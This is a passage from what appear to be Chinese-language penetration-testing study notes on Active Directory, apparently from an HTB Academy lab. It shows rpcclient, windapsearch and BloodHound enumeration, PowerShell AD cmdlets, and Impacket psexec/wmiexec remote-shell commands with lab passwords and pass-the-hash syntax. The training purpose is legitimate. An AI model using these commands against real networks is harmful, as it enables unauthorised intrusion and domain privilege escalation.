EDT</span><br><span class="line">        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT</span><br><span class="line">        unknown_2[0..31]...</span><br><span class="line">        user_rid :      0x457</span><br><span class="line">        group_rid:      0x201</span><br><span class="line">        acb_info :      0x00000010</span><br><span class="line">        fields_present: 0x00ffffff</span><br><span class="line">        logon_divs:     168</span><br><span class="line">        bad_password_count:     0x00000000</span><br><span class="line">        logon_count:    0x0000001d</span><br><span class="line">        padding1[0..7]...</span><br><span class="line">        logon_hrs[0..21]...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line"></span><br><span class="line">user:[administrator] rid:[0x1f4]</span><br><span class="line">user:[guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[lab_adm] rid:[0x3e9]</span><br><span class="line">user:[htb-student] rid:[0x457]</span><br><span class="line">user:[avazquez] rid:[0x458]</span><br><span class="line">user:[pfalcon] rid:[0x459]</span><br><span class="line">user:[fanthony] rid:[0x45a]</span><br><span class="line">user:[wdillard] rid:[0x45b]</span><br><span class="line">user:[lbradford] rid:[0x45c]</span><br><span class="line">user:[sgage] rid:[0x45d]</span><br><span class="line">user:[asanchez] rid:[0x45e]</span><br><span class="line">user:[dbranch] rid:[0x45f]</span><br><span class="line">user:[ccruz] rid:[0x460]</span><br><span class="line">user:[njohnson] rid:[0x461]</span><br><span class="line">user:[mholliday] rid:[0x462]</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;  </span><br></pre></td></tr></table></figure>

<h2 id="Impacket-Toolkit"><a href="#Impacket-Toolkit" class="headerlink" title="Impacket Toolkit"></a>Impacket Toolkit</h2><h3 id="psexec-py"><a href="#psexec-py" class="headerlink" title="psexec.py"></a>psexec.py</h3><p><code>Psexec.py</code> 是 Sysinternals psexec 可执行文件的克隆，但工作方式与原始版本略有不同。该工具通过将随机命名的可执行文件上传到目标主机上的<code>ADMIN$</code>共享来创建远程服务。然后它通过<code>RPC</code>和<code>Windows Service Control Manager</code>注册该服务。一旦建立，通信就会通过命名管道进行，并在受害主机上以<code>SYSTEM</code>身份提供交互式远程 shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.py inlanefreight.local/wley:&#x27;transporter@4&#x27;@172.16.5.125</span><br><span class="line"># or</span><br><span class="line">psexec.py inlanefreight.local/wley@172.16.5.125 -hashes LM_hash:NT_hash</span><br></pre></td></tr></table></figure>

<h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p><code>wmiexec.py</code>使用半交互式 shell，其中命令通过<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page">Windows Management Instrumentation</a>执行。它不会在目标主机上放置任何文件或可执行文件，并且生成的日志比其他模块少。连接后，它会以连接的本地管理员用户身份运行。与其他工具相比，这是一种在主机上执行的更隐蔽的方法，但仍可能被大多数现代防病毒和 EDR 系统捕获。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py inlanefreight.local/wley:&#x27;transporter@4&#x27;@172.16.5.5</span><br><span class="line"># or</span><br><span class="line">wmiexec.py inlanefreight.local/wley@172.16.5.5 -hashes LM_hash:NT_hash</span><br></pre></td></tr></table></figure>

<p>此 shell 环境不是完全交互式的，因此发出的每个命令都会从 WMI 执行一个新的 cmd.exe 并执行您的命令。缺点是，如果警惕的防御者检查事件日志并查看事件 ID <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688">4688：已创建一个新进程</a>，他们将看到创建一个新进程来生成 cmd.exe 并发出命令。这并不总是恶意活动，因为许多组织都使用 WMI 来管理计算机，但它可以作为调查的线索。在上面的命令，该进程是在主机上的用户 wley 的上下文中运行的（whoami），而不是以 SYSTEM 身份运行。</p>
<h2 id="windapsearch-1"><a href="#windapsearch-1" class="headerlink" title="windapsearch"></a>windapsearch</h2><h3 id="enum-2"><a href="#enum-2" class="headerlink" title="enum"></a>enum</h3><p><code>--da</code> 枚举域管理员组成员</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</span><br><span class="line"></span><br><span class="line">[+] Using Domain Controller at: 172.16.5.5</span><br><span class="line">[+] Getting defaultNamingContext from Root DSE</span><br><span class="line">[+]	Found: DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+] Attempting bind</span><br><span class="line">[+]	...success! Binded as: </span><br><span class="line">[+]	 u:INLANEFREIGHT\forend</span><br><span class="line">[+] Attempting to enumerate all Domain Admins</span><br><span class="line">[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+]	Found 28 Domain Admins:</span><br><span class="line"></span><br><span class="line">cn: Administrator</span><br><span class="line">userPrincipalName: administrator@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: lab_adm</span><br><span class="line"></span><br><span class="line">cn: Matthew Morgan</span><br><span class="line">userPrincipalName: mmorgan@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p><code>-PU</code> 查找特权用户，能对具有嵌套组成员身份的用户执行递归搜索</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</span><br><span class="line"></span><br><span class="line">[+] Using Domain Controller at: 172.16.5.5</span><br><span class="line">[+] Getting defaultNamingContext from Root DSE</span><br><span class="line">[+]     Found: DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+] Attempting bind</span><br><span class="line">[+]     ...success! Binded as:</span><br><span class="line">[+]      u:INLANEFREIGHT\forend</span><br><span class="line">[+] Attempting to enumerate all AD privileged users</span><br><span class="line">[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+]     Found 28 nested users for group Domain Admins:</span><br><span class="line"></span><br><span class="line">cn: Administrator</span><br><span class="line">userPrincipalName: administrator@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: lab_adm</span><br><span class="line"></span><br><span class="line">cn: Angela Dunn</span><br><span class="line">userPrincipalName: adunn@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Matthew Morgan</span><br><span class="line">userPrincipalName: mmorgan@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Dorothy Click</span><br><span class="line">userPrincipalName: dclick@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+]     Found 3 nested users for group Enterprise Admins:</span><br><span class="line"></span><br><span class="line">cn: Administrator</span><br><span class="line">userPrincipalName: administrator@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: lab_adm</span><br><span class="line"></span><br><span class="line">cn: Sharepoint Admin</span><br><span class="line">userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h2><p>该工具由两部分组成：用 C# 编写的用于 Windows 系统的<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">SharpHound 收集器</a>，或本节中的 BloodHound.py 收集器（也称为<code>ingestor</code>）和<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/releases">BloodHound</a> GUI 工具，它允许以 JSON 文件的形式上传收集的数据。该工具从 AD 收集数据，例如用户、组、计算机、组成员身份、GPO、ACL、域信任、本地管理员访问、用户会话、计算机和用户属性、RDP 访问、WinRM 访问等。</p>
<h3 id="SharpHound-exe"><a href="#SharpHound-exe" class="headerlink" title="SharpHound.exe"></a>SharpHound.exe</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpHound.exe <span class="literal">-c</span> All</span><br></pre></td></tr></table></figure>

<h3 id="bloodhound-python"><a href="#bloodhound-python" class="headerlink" title="bloodhound-python"></a>bloodhound-python</h3><p>它最初仅与 PowerShell 收集器一起发布，因此必须从 Windows 主机运行。最终，社区成员发布了 Python 端口（需要 Impacket、<code>ldap3</code>和<code>dnspython</code>）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bloodhound-python -ns 172.16.5.5 -d inlanefreight.local -u &#x27;forend&#x27; -p &#x27;Klmcargo2&#x27; -c all</span><br><span class="line"></span><br><span class="line">INFO: Found AD domain: inlanefreight.local</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 2 domains in the forest</span><br><span class="line">INFO: Found 564 computers</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 2951 users</span><br><span class="line">INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 183 groups</span><br><span class="line">INFO: Found 2 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>启动 neo4j，打开 BloodHound GUI，上传 json 或 zip 文件。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729153210311.png" alt="bh-injest"></p>
<p><code>Find Shortest Paths To Domain Admins</code>，它将为提供通过用户&#x2F;组&#x2F;主机&#x2F;ACL&#x2F;GPO 等关系找到的任何逻辑路径，这些关系可能允许升级到域管理员权限或同等权限。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729153271546.png" alt="bh-analysis"></p>
<h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><p>ActiveDirectory PowerShell Module 是一组 PowerShell cmdlet，用于从命令行管理 Active Directory 环境。</p>
<h3 id="Get-Module"><a href="#Get-Module" class="headerlink" title="Get-Module"></a>Get-Module</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-Module</span></span><br><span class="line"></span><br><span class="line">ModuleType Version    Name                                ExportedCommands</span><br><span class="line"><span class="literal">----------</span> <span class="literal">-------</span>    <span class="literal">----</span>                                <span class="literal">----------------</span></span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="built_in">Add-Member</span>, <span class="built_in">Add-Type</span>, <span class="built_in">Clear-Variable</span>, <span class="built_in">Compare-Object</span>...&#125;</span><br><span class="line">Script     <span class="number">2.0</span>.<span class="number">0</span>      PSReadline                          &#123;<span class="built_in">Get-PSReadLineKeyHandler</span>, <span class="built_in">Get-PSReadLineOption</span>, <span class="built_in">Remove-PS</span>...</span><br></pre></td></tr></table></figure>

<h3 id="ActiveDirectory-Module"><a href="#ActiveDirectory-Module" class="headerlink" title="ActiveDirectory Module"></a>ActiveDirectory Module</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-Module</span></span><br><span class="line"></span><br><span class="line">ModuleType Version    Name                                ExportedCommands</span><br><span class="line"><span class="literal">----------</span> <span class="literal">-------</span>    <span class="literal">----</span>                                <span class="literal">----------------</span></span><br><span class="line">Manifest   <span class="number">1.0</span>.<span class="number">1.0</span>    ActiveDirectory                     &#123;<span class="built_in">Add-ADCentralAccessPolicyMember</span>, <span class="built_in">Add-ADComputerServiceAcc</span>...</span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="built_in">Add-Member</span>, <span class="built_in">Add-Type</span>, <span class="built_in">Clear-Variable</span>, <span class="built_in">Compare-Object</span>...&#125;</span><br><span class="line">Script     <span class="number">2.0</span>.<span class="number">0</span>      PSReadline                          &#123;<span class="built_in">Get-PSReadLineKeyHandler</span>, <span class="built_in">Get-PSReadLineOption</span>, <span class="built_in">Remove-PS</span>...  </span><br></pre></td></tr></table></figure>

<h3 id="Get-ADDomain"><a href="#Get-ADDomain" class="headerlink" title="Get-ADDomain"></a>Get-ADDomain</h3><p>获取域名信息，这将打印出有用的信息，如域 SID、域功能级别、任何子域等。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADDomain</span></span><br><span class="line"></span><br><span class="line">AllowedDNSSuffixes                 : &#123;&#125;</span><br><span class="line">ChildDomains                       : &#123;LOGISTICS.INLANEFREIGHT.LOCAL&#125;</span><br><span class="line">ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DNSRoot                            : INLANEFREIGHT.LOCAL</span><br><span class="line">DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DomainMode                         : Windows2016Domain</span><br><span class="line">DomainSID                          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114</span></span><br><span class="line">ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Forest                             : INLANEFREIGHT.LOCAL</span><br><span class="line">InfrastructureMaster               : ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">LastLogonReplicationInterval       :</span><br><span class="line">LinkedGroupPolicyObjects           : &#123;cn=&#123;DDBB8574<span class="literal">-E94E-4525-8C9D-ABABE31223D0</span>&#125;,cn=policies,cn=system,DC=INLANEFREIGHT,</span><br><span class="line">                                     DC=LOCAL, CN=&#123;<span class="number">31</span>B2F340<span class="literal">-016D-11D2-945F-00C04FB984F9</span>&#125;,CN=Policies,CN=System,DC=INLAN</span><br><span class="line">                                     EFREIGHT,DC=LOCAL&#125;</span><br><span class="line">LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ManagedBy                          :</span><br><span class="line">Name                               : INLANEFREIGHT</span><br><span class="line">NetBIOSName                        : INLANEFREIGHT</span><br><span class="line">ObjectClass                        : domainDNS</span><br><span class="line">ObjectGUID                         : <span class="number">71</span>e4ecd1<span class="literal">-a9f6-4f55-8a0b-e8c398fb547a</span></span><br><span class="line">ParentDomain                       :</span><br><span class="line">PDCEmulator                        : ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">PublicKeyRequiredPasswordRolling   : True</span><br><span class="line">QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ReadOnlyReplicaDirectoryServers    : &#123;&#125;</span><br><span class="line">ReplicaDirectoryServers            : &#123;ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL&#125;</span><br><span class="line">RIDMaster                          : ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">SubordinateReferences              : &#123;DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,</span><br><span class="line">                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,</span><br><span class="line">                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,</span><br><span class="line">                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL&#125;</span><br><span class="line">SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br></pre></td></tr></table></figure>

<h3 id="Get-ADUser"><a href="#Get-ADUser" class="headerlink" title="Get-ADUser"></a>Get-ADUser</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;ServicePrincipalName <span class="operator">-ne</span> <span class="string">&quot;<span class="variable">$null</span>&quot;</span>&#125; <span class="literal">-Properties</span> ServicePrincipalName</span><br><span class="line"></span><br><span class="line">DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Enabled              : True</span><br><span class="line">GivenName            : Sharepoint</span><br><span class="line">Name                 : adfs</span><br><span class="line">ObjectClass          : user</span><br><span class="line">ObjectGUID           : <span class="number">49</span>b53bea<span class="literal">-4bc4-4a68-b694-b806d9809e95</span></span><br><span class="line">SamAccountName       : adfs</span><br><span class="line">ServicePrincipalName : &#123;adfsconnect/azure01.inlanefreight.local&#125;</span><br><span class="line">SID                  : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5244</span></span><br><span class="line">Surname              : Admin</span><br><span class="line">UserPrincipalName    :</span><br><span class="line"></span><br><span class="line">DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Enabled              : True</span><br><span class="line">GivenName            : Jessica</span><br><span class="line">Name                 : BACKUPAGENT</span><br><span class="line">ObjectClass          : user</span><br><span class="line">ObjectGUID           : <span class="number">2</span>ec53e98<span class="literal">-3a64-4706-be23-1d824ff61bed</span></span><br><span class="line">SamAccountName       : backupagent</span><br><span class="line">ServicePrincipalName : &#123;backupjob/veam001.inlanefreight.local&#125;</span><br><span class="line">SID                  : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5220</span></span><br><span class="line">Surname              : Systemmailbox <span class="number">8</span>Cc370d3<span class="literal">-822A-4Ab8-A926-Bb94bd0641a9</span></span><br><span class="line">UserPrincipalName    :</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Get-ADTrust"><a href="#Get-ADTrust" class="headerlink" title="Get-ADTrust"></a>Get-ADTrust</h3><p>打印出域具有的任何信任关系。可以确定它们是林内的信任还是与其他林中的域的信任、信任类型、信任方向以及关系所属域的名称。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : f48a1169<span class="literal">-2e58-42c1-ba32-a6ccb10057ec</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : True</span><br><span class="line">IntraForest             : False</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : <span class="number">1597717</span>f<span class="literal">-89b7-49b8-9cd9-0801d52475ca</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">8</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False  </span><br></pre></td></tr></table></figure>

<h3 id="Get-ADGroup"><a href="#Get-ADGroup" class="headerlink" title="Get-ADGroup"></a>Get-ADGroup</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADGroup</span> <span class="literal">-Filter</span> * | <span class="built_in">select</span> name</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line"><span class="literal">----</span></span><br><span class="line">Administrators</span><br><span class="line">Users</span><br><span class="line">Guests</span><br><span class="line">Print Operators</span><br><span class="line">Backup Operators</span><br><span class="line">Replicator</span><br><span class="line">Remote Desktop Users</span><br><span class="line">Network Configuration Operators</span><br><span class="line">Performance Monitor Users</span><br><span class="line">Performance Log Users</span><br><span class="line">Distributed COM Users</span><br><span class="line">IIS_IUSRS</span><br><span class="line">Cryptographic Operators</span><br><span class="line">Event Log Readers</span><br><span class="line">Certificate Service DCOM Access</span><br><span class="line">RDS Remote Access Servers</span><br><span class="line">RDS Endpoint Servers</span><br><span class="line">RDS Management Servers</span><br><span class="line">Hyper<span class="literal">-V</span> Administrators</span><br><span class="line">Access Control Assistance Operators</span><br><span class="line">Remote Management Users</span><br><span class="line">Storage Replica Administrators</span><br><span class="line">Domain Computers</span><br><span class="line">Domain Controllers</span><br><span class="line">Schema Admins</span><br><span class="line">Enterprise Admins</span><br><span class="line">Cert Publishers</span><br><span class="line">Domain Admins</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>指定组名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADGroup</span> <span class="literal">-Identity</span> <span class="string">&quot;Backup Operators&quot;</span></span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">GroupCategory     : Security</span><br><span class="line">GroupScope        : DomainLocal</span><br><span class="line">Name              : Backup Operators</span><br><span class="line">ObjectClass       : <span class="built_in">group</span></span><br><span class="line">ObjectGUID        : <span class="number">6276</span>d85d<span class="literal">-9c39-4b7c-8449-cad37e8abc38</span></span><br><span 